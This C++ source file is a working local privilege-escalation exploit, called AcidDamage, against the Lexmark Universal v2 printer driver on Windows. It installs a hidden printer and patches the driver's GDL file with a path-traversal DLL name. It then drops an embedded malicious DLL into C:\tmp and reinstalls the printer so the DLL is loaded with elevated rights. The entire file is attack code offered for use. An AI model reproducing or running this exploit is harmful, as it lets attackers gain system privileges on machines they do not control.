#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <filesystem>

#include "inject_me.hpp"
#include "aciddamage.hpp"

namespace
{
    bool installPrinter(const std::string& p_driver)
    {
        std::cout << "[+] Installing printer" << std::endl;

        std::wstring wdriver(p_driver.begin(), p_driver.end());

        // install printer
        PRINTER_INFO_2 printerInfo = { };
        ZeroMemory(&printerInfo, sizeof(printerInfo));
        printerInfo.pPortName = (LPWSTR)L"lpt1:";
        printerInfo.pDriverName = (LPWSTR)wdriver.c_str();
        printerInfo.pPrinterName = (LPWSTR)L"LexmarkPrinter";
        printerInfo.pPrintProcessor = (LPWSTR)L"WinPrint";
        printerInfo.pDatatype = (LPWSTR)L"RAW";
        printerInfo.pComment = (LPWSTR)L"Lexmark Printer";
        printerInfo.pLocation = (LPWSTR)L"Shared Lexmark Printer";
        printerInfo.Attributes = PRINTER_ATTRIBUTE_RAW_ONLY | PRINTER_ATTRIBUTE_HIDDEN;
        printerInfo.AveragePPM = 9001;
        HANDLE hPrinter = AddPrinter(NULL, 2, (LPBYTE)&printerInfo);
        if (hPrinter == 0)
        {
            std::cerr << "[-] Failed to create printer: " << GetLastError() << std::endl;
            return false;
        }

        DeletePrinter(hPrinter);
        ClosePrinter(hPrinter);
        return true;
    }

    HANDLE checkTargetDirectory(const std::string& p_targetDirectory)
    {
        std::wstring wtargetDirectory(p_targetDirectory.begin(), p_targetDirectory.end());
        return CreateFile(wtargetDirectory.c_str(), FILE_LIST_DIRECTORY,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL,
            OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
    }
}

AcidDamage::AcidDamage() :
    Exploit("Lexmark Universal v2", "AcidDamage"),
    m_target_directory("C:\\ProgramData\\Lexmark Universal v2\\"),
    m_target_dll("Universal Color Laser.gdl"),
    m_malicious_dll("Dll.dll")
{
}

AcidDamage::~AcidDamage()
{
}

bool AcidDamage::do_exploit()
{
    std::cout << "[+] Starting ACIDDAMAGE" << std::endl;
    std::cout << "[+] Checking if " << m_target_directory << " exists" << std::endl;

    DIRECTORY_INFO dirInfo;
    memset(&dirInfo, 0, sizeof(DIRECTORY_INFO));
    dirInfo.hDir = checkTargetDirectory(m_target_directory);
    if (dirInfo.hDir == INVALID_HANDLE_VALUE)
    {
        std::cout << "[-] Target directory doesn't exist. Trigger install. " << std::endl;
        installPrinter(m_driverName);
        dirInfo.hDir = checkTargetDirectory(m_target_directory);
        if (dirInfo.hDir == INVALID_HANDLE_VALUE)
        {
            std::cout << "[-] Failed to create " << m_target_directory << std::endl;
            return false;
        }
    }

    std::cout << "[+] Read in " << m_target_directory << m_target_dll << std::endl;

    std::string fcontents;
    std::ifstream gpl_file;
    gpl_file.open(m_target_directory + m_target_dll, std::ifstream::in);
    while (!gpl_file.is_open())
    {
        std::cout << "[-] Failed to open " << m_target_directory << m_target_dll << std::endl;
        return false;
    }

    while (gpl_file.good())
    {
        fcontents.push_back(gpl_file.get());
    }

    gpl_file.close();

    std::cout << "[+] Searching file contents " << std::endl;
    std::string target("<GDL_ATTRIBUTE Name=\"*Name\" xsi:type=\"GDLW_string\">LMUD1OUE.DLL</GDL_ATTRIBUTE>");
    std::size_t pos = fcontents.find(target);
    if (pos == std::string::npos)
    {
        std::cout << "[-] Failed to find vulnerable string" << std::endl;
        return false;
    }

    std::cout << "[+] Updating file contents" << std::endl;
    fcontents.replace(pos, target.size(), "<GDL_ATTRIBUTE Name=\"*Name\" xsi:type=\"GDLW_string\">..\\..\\..\\..\\..\\..\\tmp\\" + m_malicious_dll + "</GDL_ATTRIBUTE>");

    std::cout << "[+] Dropping updated gpl" << std::endl;
    std::ofstream ofs(m_target_directory + m_target_dll, std::ofstream::trunc);
    ofs << fcontents;
    ofs.flush();
    ofs.close();

    std::cout << "[+] Dropping dll to disk" << std::endl;
    std::filesystem::create_directory("C:\\tmp\\");
    std::ofstream dll_out("C:\\tmp\\" + m_malicious_dll, std::ofstream::out | std::ofstream::binary | std::ofstream::trunc);
    for (unsigned int i = 0; i < inject_me_dll_len; i++)
    {
        dll_out << inject_me_dll[i];
    }
    dll_out.flush();
    dll_out.close();

    installPrinter(m_driverName);

    return true;
}
